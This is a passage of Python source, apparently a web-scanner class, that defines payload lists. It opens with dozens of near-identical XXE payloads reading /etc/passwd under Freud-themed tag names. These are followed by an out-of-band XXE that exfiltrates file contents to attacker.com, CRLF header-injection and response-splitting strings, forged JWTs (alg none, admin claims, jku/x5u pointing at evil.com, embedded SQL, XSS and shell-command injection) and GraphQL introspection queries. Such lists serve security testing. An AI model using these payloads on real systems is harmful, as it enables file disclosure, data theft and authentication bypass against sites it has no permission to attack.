            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><animus>&test;</animus>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><self>&test;</self>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ego>&test;</ego>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><id>&test;</id>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><superego>&test;</superego>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><libido>&test;</libido>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thanatos>&test;</thanatos>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><eros>&test;</eros>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><oedipuscomplex>&test;</oedipuscomplex>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><electracomplex>&test;</electracomplex>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><penisenvy>&test;</penisenvy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><wombenvy>&test;</wombenvy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><castrationanxiety>&test;</castrationanxiety>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><phallicsymbol>&test;</phallicsymbol>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><vaginadentata>&test;</vaginadentata>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><primalscene>&test;</primalscene>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><primalhorde>&test;</primalhorde>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><totemandtaboo>&test;</totemandtaboo>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><civilizationanditsdiscontents>&test;</civilizationanditsdiscontents>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><futureofanillusion>&test;</futureofanillusion>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><mosesandmonotheism>&test;</mosesandmonotheism>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><interpretationofdreams>&test;</interpretationofdreams>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><psychopathologyofeverydaylife>&test;</psychopathologyofeverydaylife>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><jokesandtheirrelationtotheunconscious>&test;</jokesandtheirrelationtotheunconscious>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><beyondthepleasureprinciple>&test;</beyondthepleasureprinciple>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theegoandtheid>&test;</theegoandtheid>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><inhibitionssymptomsandanxiety>&test;</inhibitionssymptomsandanxiety>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thequestionoflayanalysis>&test;</thequestionoflayanalysis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thefutureprospectsofpsychoanalytictherapy>&test;</thefutureprospectsofpsychoanalytictherapy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><recommendationstophysicianspractisingpsychoanalysis>&test;</recommendationstophysicianspractisingpsychoanalysis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><onthehistoryofthepsychoanalyticmovement>&test;</onthehistoryofthepsychoanalyticmovement>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><anautobiographicalstudy>&test;</anautobiographicalstudy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theresistancestopsychoanalysis>&test;</theresistancestopsychoanalysis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theclaimsofpsychoanalysistoscientificinterest>&test;</theclaimsofpsychoanalysistoscientificinterest>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thepsychoanalyticviewofpsychogenicdisturbanceofvision>&test;</thepsychoanalyticviewofpsychogenicdisturbanceofvision>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theuncanny>&test;</theuncanny>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thethemeofthethreecaskets>&test;</thethemeofthethreecaskets>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><themosesofmichelangelo>&test;</themosesofmichelangelo>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><leonardodavinciandamemoryofhischildhood>&test;</leonardodavinciandamemoryofhischildhood>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><dostoevskyandparricide>&test;</dostoevskyandparricide>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><achildhoodrecollectionfromdichtungundwahrheit>&test;</achildhoodrecollectionfromdichtungundwahrheit>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theantitheticalmeaningofprimalwords>&test;</theantitheticalmeaningofprimalwords>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theacquisitionofpoweroverfire>&test;</theacquisitionofpoweroverfire>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theoccurrenceindreamsofmaterialfromfairytales>&test;</theoccurrenceindreamsofmaterialfromfairytales>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><aconnectionbetweenasymbolandasymptom>&test;</aconnectionbetweenasymbolandasymptom>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><somecharactertypesmetwithinpsychoanalyticwork>&test;</somecharactertypesmetwithinpsychoanalyticwork>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thosewreckedbysuccess>&test;</thosewreckedbysuccess>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theexceptions>&test;</theexceptions>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><criminalsfromasenseofguilt>&test;</criminalsfromasenseofguilt>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><therelationofthepoettodaydreaming>&test;</therelationofthepoettodaydreaming>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><creativewritersanddaydreaming>&test;</creativewritersanddaydreaming>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><familyromances>&test;</familyromances>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><contributionstothepsychologyoflove>&test;</contributionstothepsychologyoflove>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><aspecialtypeofchoiceofobjectmadebymen>&test;</aspecialtypeofchoiceofobjectmadebymen>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><ontheuniversaltendencytodebasementinthesphereoflove>&test;</ontheuniversaltendencytodebasementinthesphereoflove>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thetabooofvirginity>&test;</thetabooofvirginity>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><civilizedsexualmoralityandmodernnervousillness>&test;</civilizedsexualmoralityandmodernnervousillness>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thesexualenlightenmentofchildren>&test;</thesexualenlightenmentofchildren>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><onthesexualtheoriesofchildren>&test;</onthesexualtheoriesofchildren>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><analysisofaphobiainafiveyearoldboy>&test;</analysisofaphobiainafiveyearoldboy>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><notesuponacaseofobsessionalneurosis>&test;</notesuponacaseofobsessionalneurosis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><fromthehistoryofaninfantileneurosis>&test;</fromthehistoryofaninfantileneurosis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thepsychogenesisofacaseofhomosexualityinawoman>&test;</thepsychogenesisofacaseofhomosexualityinawoman>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><someneuroticmechanismsinjealousyparanoiaandhomosexuality>&test;</someneuroticmechanismsinjealousyparanoiaandhomosexuality>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><aneurosisofdemoniacalpossessionintheseventeenthcentury>&test;</aneurosisofdemoniacalpossessionintheseventeenthcentury>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><aseventeenthcenturydemonologicalneurosis>&test;</aseventeenthcenturydemonologicalneurosis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theeconomicproblemofmasochism>&test;</theeconomicproblemofmasochism>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><theinfantilegenitalorganization>&test;</theinfantilegenitalorganization>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thedissolutionoftheoedipuscomplex>&test;</thedissolutionoftheoedipuscomplex>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><somepsychicalconsequencesoftheanatomicaldistinctionbetweenthesexes>&test;</somepsychicalconsequencesoftheanatomicaldistinctionbetweenthesexes>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><femalesexuality>&test;</femalesexuality>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><femininity>&test;</femininity>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thepassingoftheoedipuscomplex>&test;</thepassingoftheoedipuscomplex>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thepsychicalapparatusandtheexternalworld>&test;</thepsychicalapparatusandtheexternalworld>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thetheoryoftheinstincts>&test;</thetheoryoftheinstincts>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thedevelopmentofthesexuallfunction>&test;</thedevelopmentofthesexuallfunction>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><somethoughtsondevelopmentandregressionaetiology>&test;</somethoughtsondevelopmentandregressionaetiology>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><thetechniqueofpsychoanalysis>&test;</thetechniqueofpsychoanalysis>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><anexampleofpsychoanalyticwork>&test;</anexampleofpsychoanalyticwork>',
            

            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">%remote;]><root/>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><root/>',
        ]
        
        self.crlf_payloads = [

            "test%0d%0aHeader:injected",
            "test%0d%0a%0d%0aHTTP/1.1 200 OK",
            "test%0d%0aContent-Length:0%0d%0a%0d%0a",
            "%0d%0aX-Forwarded-Host:attacker.com",
            "%0d%0aSet-Cookie:malicious=payload",
            

            "test\r\nHeader:injected",
            "test\nHeader:injected",
            "test\rHeader:injected",
            "test%0aHeader:injected",
            "test%0dHeader:injected",
            

            "%0d%0a%0d%0a",
            "\r\n\r\n",
            "%0a%0a",
            "\n\n",
            

            "%0d%0aX-Forwarded-For:127.0.0.1",
            "%0d%0aX-Real-IP:127.0.0.1",
            "%0d%0aX-Client-IP:127.0.0.1",
            "%0d%0aX-Remote-IP:127.0.0.1",
            "%0d%0aX-Remote-Addr:127.0.0.1",
            "%0d%0aX-Host:attacker.com",
            "%0d%0aX-Originating-IP:127.0.0.1",
            "%0d%0aX-Forwarded-Host:attacker.com",
            "%0d%0aX-Forwarded-Server:attacker.com",
            "%0d%0aX-HTTP-Host-Override:attacker.com",
            

            "%0d%0aX-Cache:bypass",
            "%0d%0aCache-Control:no-cache",
            "%0d%0aPragma:no-cache",
            "%0d%0aExpires:0",
            

            "%0d%0aContent-Security-Policy:default-src *",
            "%0d%0aX-Content-Type-Options:nosniff",
            "%0d%0aX-Frame-Options:DENY",
            "%0d%0aX-XSS-Protection:0",
            "%0d%0aStrict-Transport-Security:max-age=0",
            

            "%0d%0aSet-Cookie:sessionid=malicious",
            "%0d%0aSet-Cookie:admin=true",
            "%0d%0aSet-Cookie:auth=bypass",
            "%0d%0aSet-Cookie:role=admin",
            "%0d%0aSet-Cookie:user=attacker",
            

            "%0d%0aLocation:http://attacker.com",
            "%0d%0aRedirect:http://attacker.com",
            "%0d%0aRefresh:0;url=http://attacker.com",
            

            "%0d%0aContent-Type:text/html",
            "%0d%0aContent-Type:application/x-javascript",
            

            "%0d%0aContent-Length:0",
            "%0d%0aContent-Length:999999",
            

            "%0d%0aTransfer-Encoding:chunked",
            

            "%0d%0aServer:Apache/2.4.1",
            "%0d%0aServer:nginx/1.0.0",
            

            "%0d%0aVia:1.1 attacker.com",
            

            "%0d%0aX-Powered-By:PHP/7.0.0",
            "%0d%0aX-Powered-By:ASP.NET",
            

            "%0d%0aX-Custom-Header:injected",
            "%0d%0aX-Attacker:true",
            "%0d%0aX-Vulnerable:yes",
            

            "%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:100%0d%0a%0d%0a<html>Injected</html>",
            "%0d%0a%0d%0aHTTP/1.0 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
            

            "test%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0aContent-Length: 47%0d%0a%0d%0a<html><body>Injected Response</body></html>",
            

            "%0d%0a :injected",
            "%0d%0aHeader : value",
            "%0d%0aHeader: value ",
            "%0d%0aHeader:value",
            

            "%09Header:injected",
            "\tHeader:injected",
            "test%09Header:injected",
            

            "%20Header:injected",
            " Header:injected",
            

            "%00%0d%0aHeader:injected",
            "\x00\r\nHeader:injected",
            

            "%E2%80%A8Header:injected",
            "%E2%80%A9Header:injected",
            

            "%0d%0a%0aHeader:injected",
            "%0d%0a%0dHeader:injected",
            "\r\n\nHeader:injected",
            

            "%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a0%0d%0a%0d%0a",
            

            "%0d%0aX-Smuggle: true",
            "%0d%0aX-HTTP-Smuggling: detected",
            

            "%0d%0aUser-Agent: Mozilla/5.0 (Injected)",
            "%0d%0aReferer: http://attacker.com",
            

            "%0d%0aX-XSS-Protection: 0",
            "%0d%0aX-Content-Type-Options: ",
            

            "%0d%0aX-Cache: HIT",
            "%0d%0aAge: 999999",
            "%0d%0aX-Cache-Hits: 100",
            

            "%0d%0aX-DoS: true",
            "%0d%0aX-Overload: yes",
            

            "%0d%0aUpgrade: websocket",
            "%0d%0aConnection: Upgrade",
            

            "%0d%0aAccept-Encoding: gzip, deflate",
            "%0d%0aContent-Encoding: gzip",
            

            "%0d%0aRange: bytes=0-10",
            "%0d%0aIf-Range: *",
            

            "%0d%0aIf-Modified-Since: Thu, 01 Jan 1970 00:00:00 GMT",
            "%0d%0aIf-None-Match: *",
            

            "%0d%0aAuthorization: Basic YWRtaW46YWRtaW4=",
            "%0d%0aWWW-Authenticate: Basic realm=\"attacker\"",
            

            "%0d%0aX-Forwarded-Proto: https",
            "%0d%0aX-Forwarded-Port: 443",
            "%0d%0aX-Forwarded-Scheme: https",
            

            "%0d%0aAccess-Control-Allow-Origin: *",
            "%0d%0aAccess-Control-Allow-Credentials: true",
            "%0d%0aAccess-Control-Allow-Methods: *",
            

            "%0d%0aStrict-Transport-Security: max-age=31536000; includeSubDomains; preload",
            

            "%0d%0aContent-Security-Policy: default-src 'self'",
            "%0d%0aContent-Security-Policy: default-src *",
            

            "%0d%0aFeature-Policy: camera 'none'; microphone 'none'",
            

            "%0d%0aReferrer-Policy: no-referrer",
            

            "%0d%0aExpect-CT: max-age=0, enforce",
            

            "%0d%0aX-Permitted-Cross-Domain-Policies: none",
            

            "%0d%0aX-Download-Options: noopen",
            

            "%0d%0aClear-Site-Data: \"cache\", \"cookies\", \"storage\"",
            

            "%0d%0aCross-Origin-Embedder-Policy: require-corp",
            "%0d%0aCross-Origin-Opener-Policy: same-origin",
            "%0d%0aCross-Origin-Resource-Policy: same-site",
            

            "%0d%0aServer-Timing: db;dur=53, app;dur=47.2",
            

            "%0d%0aSourceMap: https://attacker.com/source.map",
            

            "%0d%0aX-SourceMap: https://attacker.com/source.map",
            

            "%0d%0aDeprecation: true",
            

            "%0d%0aNEL: {\"report_to\":\"attacker\",\"max_age\":31536000}",
            

            "%0d%0aReport-To: {\"group\":\"attacker\",\"max_age\":31536000,\"endpoints\":[{\"url\":\"https://attacker.com/reports\"}]}",
            

            "%0d%0aReporting-Endpoints: attacker=\"https://attacker.com/reports\"",
            

            "%0d%0aPermissions-Policy: camera=(), microphone=(), geolocation=()",
        ]
        
        self.jwt_payloads = [

            "eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.ABC123",
            

            '{"alg":"none","typ":"JWT"}.{"sub":"1234567890","name":"Admin","iat":1516239022}.',
            '{"alg":"none"}.{"sub":"admin","role":"admin"}.',
            '{"alg":"None","typ":"JWT"}.{"sub":"1","admin":true}.',
            '{"alg":"NONE"}.{"user":"admin","is_admin":true}.',
            

            '{"alg":"HS256","typ":"JWT"}.{"sub":"1234567890","name":"Admin","iat":1516239022}.signature',
            '{"alg":"HS256"}.{"user_id":1,"role":"administrator"}.weaksecret',
            '{"alg":"HS256"}.{"username":"admin","admin":true}.secret',
            

            '{"alg":"HS256","typ":"JWT"}.{"sub":"admin","role":"admin"}.',
            '{"alg":"HS256"}.{"user":"superadmin","privileges":"all"}.',
            

            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.",
            

            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalidsignature",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.invalid",
            

            '{"typ":"JWT"}.{"sub":"admin","role":"admin"}.signature',
            '{"typ":"JWT"}.{"user":"admin"}.sig',
            

            '{"alg":"HS256"}.{"sub":"admin","role":"superadmin","iat":1516239022}.',
            '{"alg":"HS256"}.{"user_id":0,"admin":true}.',
            '{"alg":"HS256"}.{"username":"admin","is_admin":1}.',
            '{"alg":"HS256"}.{"email":"admin@example.com","role":"administrator"}.',
            

            '{"alg":"HS256"}.{"sub":"admin","exp":1000000000}.',
            '{"alg":"HS256"}.{"user":"admin","exp":1}.',
            '{"alg":"HS256"}.{"sub":"1","exp":0}.',
            

            '{"alg":"HS256"}.{"sub":"admin","nbf":9999999999}.',
            '{"alg":"HS256"}.{"user":"admin","nbf":4102444800}.',
            

            '{"alg":"HS256"}.{"sub":"admin","roles":["admin","superuser","root"]}.',
            '{"alg":"HS256"}.{"username":"admin","permissions":["*"]}.',
            '{"alg":"HS256"}.{"user_id":1,"access_level":"maximum"}.',
            

            '{"alg":"HS256"}.{"sub":"admin\' OR \'1\'=\'1","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin\" UNION SELECT 1,2,3--","role":"user"}.',
            '{"alg":"HS256"}.{"email":"admin@example.com\' AND 1=1--","role":"admin"}.',
            

            '{"alg":"HS256"}.{"name":"<script>alert(1)</script>","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin<img src=x onerror=alert(1)>","role":"user"}.',
            '{"alg":"HS256"}.{"description":"<svg/onload=alert(1)>","role":"admin"}.',
            

            '{"alg":"HS256"}.{"sub":"../../../etc/passwd","role":"user"}.',
            '{"alg":"HS256"}.{"filename":"../../../../windows/win.ini","role":"admin"}.',
            

            '{"alg":"HS256"}.{"sub":"admin;id","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin|ls -la","role":"admin"}.',
            '{"alg":"HS256"}.{"email":"admin@example.com`whoami`","role":"user"}.',
            

            '{"alg":"HS256","jku":"http://evil.com/jwks.json"}.{"sub":"admin"}.',
            '{"alg":"HS256","jwk":{"kty":"RSA","kid":"evil","use":"sig","n":"..."}}.{"sub":"admin"}.',
            '{"alg":"HS256","kid":"../../../../dev/null"}.{"sub":"admin"}.',
            '{"alg":"HS256","kid":"<script>alert(1)</script>"}.{"sub":"admin"}.',
            

            '{"alg":"RS256","x5u":"http://evil.com/cert"}.{"sub":"admin"}.',
            '{"alg":"RS256","x5c":["MIIC..."],"kid":"evil"}.{"sub":"admin"}.',
            

            '{"alg":"RS256"}.{"sub":"admin"}.',
            '{"alg":"ES256"}.{"sub":"admin"}.',
            '{"alg":"PS256"}.{"sub":"admin"}.',
            '{"alg":"HS384"}.{"sub":"admin"}.',
            '{"alg":"HS512"}.{"sub":"admin"}.',
            '{"alg":"RS384"}.{"sub":"admin"}.',
            '{"alg":"RS512"}.{"sub":"admin"}.',
            '{"alg":"ES384"}.{"sub":"admin"}.',
            '{"alg":"ES512"}.{"sub":"admin"}.',
            

            '{"alg":"hs256"}.{"sub":"admin"}.',
            '{"alg":"HS256"}.{"sub":"admin"}.',
            '{"alg":"Hs256"}.{"sub":"admin"}.',
            '{"alg":"hS256"}.{"sub":"admin"}.',
            

            '{"alg":"HS256"}.{"sub":"admin\\u0000","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin\\x00","role":"admin"}.',
            

            '{"alg":"HS256"}.{"sub":"admin\u202e","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin\u200b","role":"admin"}.',
            

            '{"alg":"HS256"}.{"sub":"' + 'A'*10000 + '","role":"user"}.',
            '{"alg":"HS256"}.{"data":"' + 'B'*50000 + '"}.',
            

            '{"alg":"HS256"}.{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"}.',
            

            '{"alg":"HS256"}..{"sub":"admin"}..',
            '{"alg":"HS256"}...{"sub":"admin"}...',
            

            '{"alg":"HS256"}{"sub":"admin"}signature',
            '{"alg":"HS256"}.{"sub":"admin"}signature',
            '{"alg":"HS256"}.{"sub":"admin"}.',
            

            '{"alg":"HS256"}..{"sub":"admin"}.signature',
            '{"alg":"HS256"}.{"sub":"admin"}..signature',
            

            '.{"sub":"admin"}.signature',
            '{"alg":"HS256"}..signature',
            '..signature',
            

            '{"alg":"HS256"}.{"sub":"admin&test=1","role":"user"}.',
            '{"alg":"HS256"}.{"username":"admin<script>","role":"admin"}.',
            '{"alg":"HS256"}.{"email":"admin@example.com\'\"","role":"user"}.',
            

            '{"alg":"HS256"}.{"sub":"admin","roles":["user","admin","superuser"]}.',
            '{"alg":"HS256"}.{"permissions":["read","write","execute","delete"]}.',
            

            '{"alg":"HS256"}.{"user":{"id":1,"name":"admin","roles":["admin"]}}.',
            '{"alg":"HS256"}.{"profile":{"email":"admin@example.com","settings":{"theme":"dark"}}}.',
            

            '{"alg":"HS256"}.{"admin":true,"active":false,"verified":true}.',
            '{"alg":"HS256"}.{"is_superuser":1,"is_staff":1,"is_active":1}.',
            

            '{"alg":"HS256"}.{"user_id":0,"group_id":1001,"level":999}.',
            '{"alg":"HS256"}.{"id":"0","uid":"1000","gid":"0"}.',
            

            '{"alg":"HS256"}.{"iat":1,"exp":4102444800,"nbf":1}.',
            '{"alg":"HS256"}.{"iat":9999999999,"exp":9999999999,"nbf":9999999999}.',
            

            '{"algorithm":"HS256"}.{"sub":"admin"}.',
            '{"alg":"HS256","type":"JWT"}.{"sub":"admin"}.',
            '{"alg":"HS256","typ":"jwt"}.{"sub":"admin"}.',
            

            '{"alg":"HS256","cty":"JWT"}.{"sub":"admin"}.',
            '{"alg":"HS256","cty":"json"}.{"sub":"admin"}.',
            

            '{"alg":"HS256","crit":["exp"]}.{"sub":"admin"}.',
            '{"alg":"HS256","crit":["nbf","exp"]}.{"sub":"admin"}.',
            

            'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.signature',
            'eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.',
            'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.sig',
        ]

        
        self.graphql_payloads = [

            "{__schema{types{name,fields{name}}}}",
            "{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}} fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}} fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue} fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}",
